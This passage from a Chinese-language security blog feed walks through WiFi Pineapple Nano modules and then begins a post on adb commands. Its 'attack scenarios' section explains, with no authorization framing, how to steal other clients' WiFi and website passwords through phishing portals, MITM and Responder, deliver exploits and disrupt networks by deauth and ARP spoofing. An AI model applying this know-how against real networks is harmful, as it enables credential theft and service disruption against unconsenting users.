或 HTML 的</p><p>只有WiFi Pineapple具有Internet连接时，才会显示此页面</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210108005535734.png" alt="image-20210108005535734" style="zoom: 33%;"><h2 id="12-Advanced"><a href="#12-Advanced" class="headerlink" title="12.Advanced"></a>12.Advanced</h2><p>此页面显示一些系统资源信息，USB 设备，文件系统列表，CSS 和固件升级。</p><h2 id="13-Help"><a href="#13-Help" class="headerlink" title="13.Help"></a>13.Help</h2><p>可以查看对应模块的帮助和使用介绍</p><h1 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h1><h2 id="模块总结"><a href="#模块总结" class="headerlink" title="模块总结"></a>模块总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">DWall 绵羊墙，可以显示 HTTP URLs, Cookies, POST DATA，可实时展示客户端的</span><br><span class="line">图片</span><br><span class="line">Deauth 对菠萝附近接入到其他 AP 的客户端进行认证攻击</span><br><span class="line">EvilPortal 一个邪恶的强制网络门户</span><br><span class="line">SSLsplit 使用 SSLsplit 执行中间人攻击</span><br><span class="line">Status 显示设备的状态信息</span><br><span class="line">ettercap 使用 ettercap 执行中间人攻击</span><br><span class="line">NMAP GUI 的安全扫描器 NMAP</span><br><span class="line">SiteSurvey 无线现场调查</span><br><span class="line">urlsnarf 使用 urlsnarf 输出 客户端所有的 http URL 请求</span><br><span class="line">Occupineapple 广播用于欺骗的 WiFi SSID 热点</span><br><span class="line">tcpdump 使用 tcpdump 抓取 客户端数据包</span><br><span class="line">DNSspoof dns 欺骗</span><br><span class="line">SignalStrength 显示附近 ap 的信号强度</span><br><span class="line">RandomRoll 恶搞连接到菠萝的客户端</span><br><span class="line">wps 使用 Reaver, Bully and Pixiewps 进行 wps 攻击</span><br><span class="line">ConnectedClients 显示当前连接的客户端设备的信息</span><br><span class="line">OnlineHashCrack 提交 Hash 和 WPA Handshake 包 到 www.onlinehashcrack.com</span><br><span class="line">PortalAuth 强制门户克隆 和 流量分发</span><br><span class="line">get 通过客户端的浏览器插件来识别客户端的信息</span><br><span class="line">p0f 使用 p0f 被动流量指纹</span><br><span class="line">Papers 一个 TLS&#x2F; SSL 和 SSH 证书生成管理插件</span><br><span class="line">LogManager 管理所有模块的 log 信息</span><br><span class="line">Cabinet web 页面的文件管理器</span><br><span class="line">Responder LLMNR，NBT-NS 和 MDNS 投毒内置的 HTTP，SMB，MSSQL，FTP 和 LDAP</span><br><span class="line">流氓认证服务器</span><br><span class="line">DNSMasqSpoof 使用 dnsmasq 来进行 dns 欺骗</span><br><span class="line">ngrep 使用 ngrep 来匹配查找数据包</span><br><span class="line">autossh autossh 插件，可用于远程 ssh 来管理菠萝</span><br><span class="line">dump1090 使用 RTS-SDR 获取轨道飞行器的 ADS-B 信标</span><br><span class="line">KeyManager ssh 密匙管理器</span><br><span class="line">CursedScreech 安全控制容易被入侵的系统</span><br><span class="line">base64encdec Base64 编码和解码</span><br><span class="line">ModuleMaker module 生成工具</span><br><span class="line">APITokens 在 wifipineapple 上创建和删除 API 令牌</span><br><span class="line">Commander 通过 IRC 控制菠萝</span><br><span class="line">HackRF HackRF 插件</span><br></pre></td></tr></table></figure><h2 id="DWall绵羊墙"><a href="#DWall绵羊墙" class="headerlink" title="DWall绵羊墙"></a>DWall绵羊墙</h2><p>DWall 是一款可以实时抓取 http 数据的插件，并且可以实时展示在web页面上</p><p>Enable开启模块，Start Listening 开始监听</p><p>所有连到 Pineapple 客户端的http连接都会被抓到</p><p>页面显示了客户端、URL、Cookies、数据内容，以及图片</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120155024676.png" alt="image-20210120155024676"></p><h2 id="Deauth"><a href="#Deauth" class="headerlink" title="Deauth"></a>Deauth</h2><p>De-authenticationFlood Attack，全称为取消身份验证洪水攻击或验证阻断洪水攻击，通常被简称为Deauth攻击，是无线网络拒绝服务攻击的一种形式。它旨在通过欺骗从AP到客户端单播地址的取消身份验证帧来将客户端转为未关联／未认证的状态</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120155608984.png" alt="image-20210120155608984"></p><p>normal模式下，选中网卡，点击 Start 后就开始攻击攻击过程中同网段内的网络认证（由于NANO不支持5G，所以攻击仅支持2.4G）均会失败，无法认证并连接</p><p>要针对某个WI-FI攻击，可以在Editor中选中网卡，扫描WI-FI，并Add to Blacklist（添加到黑名单），在Mode中也选择blacklist，输入Channels，信道可以去SiteSurvey中查看</p><h2 id="DNS-DNSMasq-Spoof"><a href="#DNS-DNSMasq-Spoof" class="headerlink" title="DNS/DNSMasq Spoof"></a>DNS/DNSMasq Spoof</h2><p>这个插件会启动 DNSMasq 服务，对客户端访问的域名进行重定向</p><p>在Hosts处填写要重定向的域名，写法与其他 Hosts 文件一致</p><p>此处可以填写内网配置好的钓鱼服务器，也可以指到Pineapple，并在上面搭建服务</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120162539271.png" alt="image-20210120162539271"></p><h2 id="Urlsnarf-URL捕获"><a href="#Urlsnarf-URL捕获" class="headerlink" title="Urlsnarf URL捕获"></a>Urlsnarf URL捕获</h2><p>选定网口后点击 Start ，模块将会捕获全部的HTTP流量，GET及POST的数据均会显示</p><p>显示格式为web访问日志类型</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120163418442.png" alt="image-20210120163418442"></p><h2 id="Evil-Portal"><a href="#Evil-Portal" class="headerlink" title="Evil Portal"></a>Evil Portal</h2><p>模块主要由以下几个部分组成：</p><p>Controls（控制）：启用模块和设置自动启动；</p><p>Word Bench（创建工作目录）：包含门户页面的php文件等；</p><p>White List（白名单）：不需要通过门户认证页面跳转的IP地址列表；</p><p>Authorized Clients（认证客户端）：当前通过门户页面认证跳转过的IP地址列表；</p><p>Live Preview（预览）：预览恶意门户页面。</p><p>Evil Portal模块和自带的Landing Page功能很像，区别在于Landing Page仅能够提供一个强制跳转显示页面的效果，不具有认证、白名单以及更自由化的门户页面自定义功能。Evil Portal能够实现像现在的商业WiFi接入访问一样，提供一个由我们自定义的认证页面，引导客户端用户完成认证及跳转功能</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120170837202.png" alt="image-20210120170837202"></p><h2 id="Tcpdump"><a href="#Tcpdump" class="headerlink" title="Tcpdump"></a>Tcpdump</h2><p>tcpdump可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来去掉无用的信息，是一款非常高级的网络数据分析工具</p><p>与Pineapple上很多其他的模块一样，提供的可供点选的web管理界面</p><p>Options提供了基本的选项模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120174258901.png" alt="image-20210120174258901"></p><p>在下方选中或勾选的参数将会被格式化到 Command 处</p><p>Interface 为需要监听的端口</p><p>Verbose 对应 -v 选项，代表输出报文信息的详细程度</p><p>Resolve 对应 -n 选项，不将主机名转换为IP地址，以及不进行端口名称的转换</p><p>Timestamp 对应 -t 选项，指定是否输出时间戳或时间戳格式</p><p>Don’t print domain name qualification of host names:对应 -N 选项，不输出主机名中的域名部分。例如，’wiki.ver007.org’只输出’wiki’</p><p>Show the packet’s contents in both hex and ASCII:对应 -X 选项，在解析和打印时，除了打印每个包的报头之外，还要用十六进制和ASCII打印每个包的数据（通常用于分析一种协议）</p><p>Print absolute sequence numbers：对应 -S 选项，将tcp的序列号以绝对值形式输出</p><p>Get the ethernet header as well：对应 -e 选项，在输出行打印出数据链路层的头部信息</p><p>Show less protocol information：对应 -q 选项，快速输出。只输出较少的协议信息</p><p>Monitor mode：对应 -I 选项，使标准输出变为缓冲行形式，可以把数据导出到文件</p><p>Filter提供了一些过滤规则，我们可以利用Filter编写过滤表达式，用来匹配得到我们想要的结果，在点选参数之后，手动输入参数值，并继续点击下一个参数，同样的，如果你熟悉tcpdump的话，可以进行手工填写，跟wireshark什么的过滤语法道理都类似</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120175018888.png" alt="image-20210120175018888"></p><p>Output为系统回显，History则可以查看和管理抓住的完整tcp数据包</p><p>在此处可以将捕获的包下载，得到一个pcap文件，可以在wireshark、networkminer、科来等其他工具中</p><p>具体的使用方法就根据需求不同定制，需要熟悉过滤表达式的编写</p><p>需要注意的是，tcpdump只能抓取流经本机的数据包，因此确保有 Client 连接上网</p><p>由于页面仅提供部分命令，如果想要达到与命令行完全一样的效果，可以SSH连接到Pineapple直接运行tcpdump.sh，路径在/pineapple/modules/tcpdump/scripts</p><h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>大名鼎鼎的 Meterpreter，配置主机端口后能够接收会话</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120190521423.png" alt="image-20210120190521423"></p><h2 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h2><p>调用 ettercap 这款工具进行中间人欺骗，将参数转换为web页面，并将输出返回到页面上</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192438752.png" alt="image-20210120192438752"></p><h2 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a>SSLsplit</h2><p>SLsplit可以作为中间人监听 SSL 信息及 HTTP 信息。SSL 实现代理的同时要与服务器建立连接，同时伪造证书与客户端建立连接，即双连接，依据获取的 Client 信息再与服务器通信，从而实现明文数据监听</p><p>Configuration无需改变，使用默认即可</p><p>在客户端使用HTTPS进行通讯时，将会由SSLsplit作为中间代理</p><p>SLLsplit的实现需要配合其他欺骗手段，如果有Clients连接到Pineapple，那么就直接可以进行攻击，如果要攻击的目标在同一网段内，则需要将目标流量定向到此模块的监听端口，通常配合 ettercap等欺骗软件</p><p>如果网站具有HSTS（HTTP Strict Transport Security）,网站将不能正常显示，也就无法攻击</p><h2 id="namp"><a href="#namp" class="headerlink" title="namp"></a>namp</h2><p>Options（选项）与图形化的Nmap页面相似，输入目标，在 Profile 中选择一些预置的规则</p><p>![image-20210120192348639](../../../../../../Library/Application Support/typora-user-images/image-20210120192348639.png)</p><h2 id="RandomRoll"><a href="#RandomRoll" class="headerlink" title="RandomRoll"></a>RandomRoll</h2><p>这个模块是一个略微搞怪的模块，开启模块后，将会把全部 http 连接进行重定向到内置的黑页中</p><p>就是下面勾选的这些 rolls，每个对应一个黑页，随机选择出现</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192115418.png" alt="image-20210120192115418"></p><p>开启后，客户端会随机出现选中的黑页</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192154957.png" alt="image-20210120192154957" style="zoom:50%;"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192211074.png" alt="image-20210120192211074" style="zoom:50%;"><h2 id="base64encode"><a href="#base64encode" class="headerlink" title="base64encode"></a>base64encode</h2><p>base64加解密模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192739363.png" alt="image-20210120192739363"></p><h2 id="CursedScreech"><a href="#CursedScreech" class="headerlink" title="CursedScreech"></a>CursedScreech</h2><p>这是一个远控模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192842955.png" alt="image-20210120192842955"></p><p>Sein：信息收集功能，当监听的网络内出现漏洞系统时，将会更新模块的 target 列表</p><p>Kuro：攻击功能，自动尝试连接Sein功能发现的目标机器，并连接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192902083.png" alt="image-20210120192902083"></p><p>Listening Interface（监听端口）：用于组播socket的接口，如果目标直接连接到Pineapple，使用br-lan就可以</p><p>Multicast Group（组播组）：发送和接收目标心跳的地址，对于Sein和目标机器，组需要相同</p><p>Multicast Port（组播端口）：Sein将从目标接收消息的端口。这个端口需要在payload的startMulticaster()方法中</p><p>Heartbeat Interval（心跳间隔）：payload发送广播的间隔，Sein在3个心跳间隔还为收到广播包的话，就会判断目标为掉线状态</p><p>Kuro Keys/Target Keys（密钥）：用于TLS通信时的密钥，可以使用Papers模块创建Keys</p><p>可以从下方两个下载按钮下载 C# 和 Python 的payload模板</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192919836.png" alt="image-20210120192919836"></p><p>Activity Log（活动日志）：记录 Kuro 功能执行过程中产生的全部记录，使用模块的大部分时间都是盯着这里看</p><p>右边的Targets就是一个上线机器列表，以及一个命令执行功能</p><p>如果有目标机器的话，可以通过Select选择机器，并执行命令</p><p>EZ Cmds事先预置了一些cmd命令，可以添加及删除</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120192935988.png" alt="image-20210120192935988" style="zoom:50%;"><p>设置好了之后，按照下载的模板，编写payload，在目标机器上运行</p><p>运行后点击Sein进行监听，测试时发现python版本的payload在监听后需要多等一下才能上线，此处要耐心等待一下，上线后可以开启Kuro，再耐心多等一会</p><p>当日志显示Kuro is ready后，就可以执行命令了</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193128326.png" alt="image-20210120193128326"></p><h2 id="dump1090"><a href="#dump1090" class="headerlink" title="dump1090"></a><strong>dump1090</strong></h2><p>本模块能够对 1090MHz 的无线电进行收取和解码，通过调用google-API等方式，可以在web地图上描绘出飞机的轨迹，当然也可以手动更改频率如：</p><p>我国民航使用的无线电频率：1090MHz</p><p>民用对讲机使用的无线电频率：408-409MHz</p><p>警用频率：350-390MHz</p><p>等等</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193206688.png" alt="image-20210120193206688"></p><p>软件有很多参数，但是界面上只显示了Gain</p><p>Checkbox 参数可以切换度量衡使用公制单位、切换到自动获取、增大功率、将结果输出为csv格式</p><p>使用此模块需要RTL-SDR（电视棒）接收无线电信号，插入模块，将显示地图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193235965.png" alt="image-20210120193235965"></p><h2 id="HackRF"><a href="#HackRF" class="headerlink" title="HackRF"></a>HackRF</h2><p>这个模块需要配合HackRF 硬件进行使用，在接入HackRF后，会出现一个简单的设置界面</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193308036.png" alt="image-20210120193308036"></p><p>模块选项相当于 hackrf_transfer 的相关参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Sample Rate（采样率）：每秒发送或接受的样本量。受到系统计算能力限制，设置过高可能会导致系统不稳定，此处建议设置默认10M或更低，相当于 -s</span><br><span class="line"></span><br><span class="line">Center Frequency（中心频率）：就是HackRF开始调谐的频率，相当于 -f</span><br><span class="line"></span><br><span class="line">Transceiever Mode（收发方式）：HackRF是半双工工作模式，因此必须指定是要 TX（发送）还是RX（接收），相当于 -t 或 -r</span><br><span class="line"></span><br><span class="line">File Name（文件名）：目标文件路径，可以将收到的信号记录，也可以从文件发送</span><br><span class="line"></span><br><span class="line">RF Amp &amp; Antenna Power（射频放大器和天线功率）：Enable RF AMP可以指定是否开启射频放大器，Antenna Power可以指定功率是否被传送到天线端口</span><br><span class="line"></span><br><span class="line">RX IF Gain &amp; RX BB Gain（RX二中频增益和RX BB增益）：根据不同层级的db及步长选择增益模式</span><br><span class="line"></span><br><span class="line">Repeat Transmission &amp; TX IF Gain（重复和TX二中频增益）：是否重复播放，以及设置发送增益</span><br></pre></td></tr></table></figure><p>先进行录制，并保存到文件中</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193343819.png" alt="image-20210120193343819"></p><p>然后进行重放，即可攻击成功，如果重放失败，可以调整放大器的增益</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193400461.png" alt="image-20210120193400461"></p><p>在实际测试过程中，将会如上图报错，调试了一会依旧无法实现功能</p><p>这个模块仅仅是简单的收取/重放，如果想要解码、编码再重放，单靠这个是实现不了的，而且在不清楚无线电工作频率的情况下还是没有办法使用，因此还是将其定义为演示模块</p><h2 id="Module-Maker"><a href="#Module-Maker" class="headerlink" title="Module Maker"></a>Module Maker</h2><p>模块制作，能够生成及管理模块</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193446797.png" alt="image-20210120193446797"></p><p>并给出了模块需要的模式</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193503219.png" alt="image-20210120193503219"></p><p>是一个为开发者编写新模块的web界面</p><h2 id="ngrep"><a href="#ngrep" class="headerlink" title="ngrep"></a>ngrep</h2><p>ngrep就相当于网络版的grep，支持大量的操作系统和网络协议。能识别TCP、UDP和ICMP包，理解bpf的过滤机制。与 tcpdump 类似</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120193538783.png" alt="image-20210120193538783"></p><h2 id="Occupineapple"><a href="#Occupineapple" class="headerlink" title="Occupineapple"></a>Occupineapple</h2><p>Occupineapple 是一个干扰模块，能够在周围生成各种随机或者自定义的SSID</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210120194727180.png" alt="image-20210120194727180"></p><p>Speed：每秒发送的数据包</p><p>Channel：在哪个信道上生成虚假AP</p><p>Show station as Ad-Hoc：将站点显示为点对点</p><p>Set WEP bit (Generates encrypted networks)：设置WEP位（生成加密网络）</p><p>Show station using WPA TKIP encryption：显示使用WPA-TKIP加密的站点</p><p>Show station using WPA AES encryption：显示使用WPA-AES加密的站点</p><p>Use valid accesspoint MAC from OUI database：使用来自OUI数据库的有效Access</p><p>Editor 参数处可以选择、编辑或创建List，List中存放SSID名称及Mac地址</p><h1 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h1><h2 id="1-搞怪"><a href="#1-搞怪" class="headerlink" title="1.搞怪"></a>1.搞怪</h2><p>如果想要简单的搞怪一下周围的人，不进行恶意的破坏和复杂的攻击行为，可以使用Occupineapple或者RandomRoll模块</p><p>使用Occupineapple在四周生成一些有趣的SSID，比如“XXX是个小智障”，“XXX是个小笨蛋”等等，十分有趣</p><p>也可以使用RandomRoll，在有客户端连入Pineapple网络时，可以将HTTP网页重定向到默认搞怪的网页上，给人一个惊喜</p><h2 id="2-技术演示"><a href="#2-技术演示" class="headerlink" title="2.技术演示"></a>2.技术演示</h2><p>如果想要给身边的人演示一些简单的WI-FI攻击，无需特别多的技术准备，可以使用Dwall、DNS/DNSMasq Spoof、urlsnarf</p><p>Dwall即是著名的“绵羊墙”，可以显示抓到的URL、cookie、图片用，用来做演示十分方便</p><p>DNS/DNSMasq Spoof 可以重定向用户DNS，配合Landing Page或其他web应用可以进行钓鱼、嗅探等</p><p>urlsnarf显示网络内http数据包，抓取到的url，显示也很直观</p><p>配合HackRF硬件可以简单重放无线电攻击，进行一些演示</p><h2 id="3-窃取密码"><a href="#3-窃取密码" class="headerlink" title="3.窃取密码"></a>3.窃取密码</h2><p>如果想要窃取在同一网络下其他客户端产生的密码，也许是某些网站账户密码，也许是其他WI-FI密码，有几种方式可以达到目的</p><p>想要获得附近的WI-FI密码，可以使用Site Survery抓取WPA握手包，再使用Online Hash Crack进行尝试破解</p><p>使用wps模块直接进行WI-FI密码破解</p><p>想要获得客户端在其他某些网站上的密码，可以使用Landing Page、Evil Portal、Portal Auth制作钓鱼页面，结合ettercap做欺骗，或者让客户端连接到Pineapple网络中，在钓鱼页面输入密码，进行记录</p><p>也可以使用ettercap进行网络欺骗，将自己欺骗成为网关，获取流量，就可以截获明文传输的密码，配合SSLsplit即可抓取https传输的密码</p><p>使用Responder进行欺骗，窃取某些协议中的密码/hash值</p><h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><p>Pineapple还提供了一些漏洞利用模块，可以针对网络内漏洞进行攻击</p><p>可以通过ettercap欺骗，替换目标下载文件，可以改变js利用浏览器漏洞，可以改变文档利用office漏洞，可以改变exe利用各种漏洞</p><p>可以使用CursedScreech的payload进行监听和执行命令</p><p>也可以使用Meterpreter接收会话</p><p>这个总结起来就是，我是你的网关，你的全部网络流量我都做主，我想怎么玩就怎么玩</p><p>组合漏洞利用 <a href="https://www.youtube.com/watch?v=Bvo43JvmeW0">https://www.youtube.com/watch?v=Bvo43JvmeW0</a></p><h2 id="5-数据采集演示"><a href="#5-数据采集演示" class="headerlink" title="5.数据采集演示"></a>5.数据采集演示</h2><p>如果使用Pineapple在网络内采集数据，用于展示或进一步分析的话，可以使用一些抓取类模块</p><p>tcpdump可以对网络数据进行抓取和过滤，配合其他软件可以进行展示</p><p>ngrep功能同上，对网络内数据进行抓取及展示</p><p>nmap用于网络内设备发现及扫描</p><p>p0f被动网络指纹识别，被动收集网络内系统指纹</p><p>get模块抓取客户端浏览器信息</p><p>dump1090配合电视棒，可以获取无线电信息，展示如飞机航线等信息</p><h2 id="6-恶意破坏"><a href="#6-恶意破坏" class="headerlink" title="6.恶意破坏"></a>6.恶意破坏</h2><p>如果就是想要搞事情，Pineapple也可以实现一些功能</p><p>可以使用ettercap进行ARP欺骗，可以导致断网</p><p>Deauth模块可以导致网络内认证失败，无法进行认证连接</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>freebuf：<a href="https://www.freebuf.com/sectool/196358.html">https://www.freebuf.com/sectool/196358.html</a></p><p>官方wiki：<a href="https://wiki.wifipineapple.com/#!index.md">https://wiki.wifipineapple.com/#!index.md</a></p><p>官方论坛：<a href="https://forums.hak5.org/">https://forums.hak5.org/</a></p><p>Modules库：<a href="https://github.com/hak5/wifipineapple-modules">https://github.com/hak5/wifipineapple-modules</a></p><p>中文用户手册：<a href="http://www.wifipi.org:8080/WiFiPineapple-用户手册-V1.3.pdf">http://www.wifipi.org:8080/WiFiPineapple-%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C-V1.3.pdf</a></p><p>搭建视频：<a href="https://www.youtube.com/watch?v=Nv1eiIwOPKo">https://www.youtube.com/watch?v=Nv1eiIwOPKo</a></p><p>模块编写视频：<a href="https://www.youtube.com/watch?v=Lvf2At3G1C0">https://www.youtube.com/watch?v=Lvf2At3G1C0</a></p><p>SSLsplit模块：<a href="https://www.roe.ch/SSLsplit">https://www.roe.ch/SSLsplit</a></p><p>ettercap模块：<a href="https://github.com/Ettercap/ettercap">https://github.com/Ettercap/ettercap</a></p><p>autossh模块：<a href="https://blog.csdn.net/fanwenjieok/article/details/53033317">https://blog.csdn.net/fanwenjieok/article/details/53033317</a></p><p>dump1090 模块：<a href="http://www.satsignal.eu/raspberry-pi/dump1090.html">http://www.satsignal.eu/raspberry-pi/dump1090.html</a></p><p>tcpdump 模块：<a href="http://www.tcpdump.org/">http://www.tcpdump.org/</a></p><p>ngrep 模块：<a href="https://www.trustauth.cn/wiki/10824.html">https://www.trustauth.cn/wiki/10824.html</a></p><p>CursedScreech 模块：<a href="https://github.com/sud0nick/CursedScreech">https://github.com/sud0nick/CursedScreech</a></p><p>Reaponder 模块：<a href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p><p>组合案例演示视频：<a href="https://www.youtube.com/watch?v=Bvo43JvmeW0">https://www.youtube.com/watch?v=Bvo43JvmeW0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;The WiFi Pineapple 是由国外无线安全审计公司Hak5开发并售卖的一款无线安全测试神器（俗称大菠萝
      
    
    </summary>
    
    
      <category term="IOT" scheme="http://www.ol4three.com/categories/IOT/"/>
    
    
      <category term="PineApple-Nano" scheme="http://www.ol4three.com/tags/PineApple-Nano/"/>
    
  </entry>
  
  <entry>
    <title>adb使用总结</title>
    <link href="http://www.ol4three.com/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/01/05/Android/adb%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</id>
    <published>2021-01-05T13:19:41.000Z</published>
    <updated>2021-01-05T13:32:14.763Z</updated>
    
    <content type="html"><![CDATA[<h1 id="adb使用"><a href="#adb使用" class="headerlink" title="adb使用"></a>adb使用</h1><h2 id="adb连接"><a href="#adb连接" class="headerlink" title="adb连接"></a>adb连接</h2><pre><code>adb connect ip:5555adb devicesadb -s device-id shell  //指定某个设备(插充电设备或USB网络时)// 查看网络状态adb shell netstat// 通过 tcp/ip 连接，默认端口 5555adb connect host:port// 转发套接字连接adb forward local remote</code></pre><h2 id="adb-截图发送到当前用户目录下"><a href="#adb-截图发送到当前用户目录下" class="headerlink" title="adb 截图发送到当前用户目录下"></a>adb 截图发送到当前用户目录下</h2><pre><code>adb exec-out screencap -p &gt; 1.png</code></pre><h2 id="adb文件导出-导入"><a href="#adb文件导出-导入" class="headerlink" title="adb文件导出/导入"></a>adb文件导出/导入</h2><h3 id="从电脑上复制文件到设备"><a href="#从电脑上复制文件到设备" class="headerlink" title="从电脑上复制文件到设备"></a>从电脑上复制文件到设备</h3><pre><code>// 把 a.png 从电脑上拷贝到设备sd卡上adb push ~/a.png /mnt/sdcard/// 把 a.png 从电脑上拷贝到设备sd卡上并重命名为 b.pngadb push ~/a.png /mnt/sdcard/b.png</code></pre><p>​    </p><pre><code>// 把 pic目录下所有文件从电脑上拷贝到设备sd卡上adb push ~/pic/ /mnt/sdcard/</code></pre><h3 id="从设备复制文件到电脑"><a href="#从设备复制文件到电脑" class="headerlink" title="从设备复制文件到电脑"></a>从设备复制文件到电脑</h3><pre><code>// 把 a.png 从设备sd卡上拷贝到电脑上adb pull /mnt/sdcard/a.png ~/// 把 a.png 从设备sd卡上拷贝到电脑上并命名为b.pngadb pull /mnt/sdcard/a.png ~/b.png// 把pics目录下所有文件从设备sd卡上拷贝到电脑上adb pull /mnt/sdcard/pics/ ~/pics/</code></pre><p>​    </p><h3 id="一些基本命令"><a href="#一些基本命令" class="headerlink" title="一些基本命令"></a>一些基本命令</h3><pre><code>// 列出sd卡根目录下所有文件adb shell ls /sdcard/// 定位到 /sdcard/目录adb shell cd /sdcard/// 删除某文件// -f 强制删除文件不需要确认// -r 递归删除文件夹内文件// -i 删除文件前需要确认adb shell rm /sdcard/1.txt// 创建目录adb shell mkdir /sdcard/temp/// 指定 -p 递归创建目录adb shell mkdir -p  /sdcard/temp/test/abc/hello/// 创建文件adb shell touch /sdcard/1.txt// 显示当前所在目录adb shell pwd// 拷贝文件1.txt到test目录adb shell cp /sdcard/1.txt /sdcard/test/// 移动文件，移动同一目录下文件相当于重命名文件adb shell mv /sdcard/1.txt /sdcard/2.text</code></pre><h2 id="adb修改手机代理"><a href="#adb修改手机代理" class="headerlink" title="adb修改手机代理"></a>adb修改手机代理</h2><h3 id="全局代理"><a href="#全局代理" class="headerlink" title="全局代理"></a>全局代理</h3><pre><code>设置代理：adb shell settings put global http_proxy 代理IP地址:端口号如：adb shell settings put global http_proxy 192.168.137.97:8888移除代理：adb shell settings delete global http_proxyadb shell settings delete global global_http_proxy_hostadb shell settings delete global global_http_proxy_port</code></pre><h3 id="证书安装"><a href="#证书安装" class="headerlink" title="证书安装"></a>证书安装</h3><blockquote><p>手机获取Root权限后，直接把Base64文本格式的根证书文件复制到etc/security/cacerts文件夹里，然后到设置(Settings) – 安全(Security) – 受信任的凭据(Trusted credentials)里面，此时你要安装的根证书应该会显示已经安装好了。这样安装之后根证书是作为系统证书使用的，而不是按照方法一安装方式的用户证书。</p></blockquote><p>.cer（非.crt）格式文件</p><p><a href="http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates">http://wiki.cacert.org/FAQ/ImportRootCert#CAcert_user_trusted_certificates</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a. openssl x509 -inform DER -subject_hash_old -in CA_Name.cer    | head -1</span><br><span class="line">得到类似字符串：9a5ba575</span><br><span class="line">b.cat CA_Name.cer  &gt; 9a5ba575.0</span><br><span class="line">c.openssl x509 -inform DER -text -in CA_Name.cer    -out &#x2F;dev&#x2F;null &gt;&gt; 9a5ba575.0</span><br><span 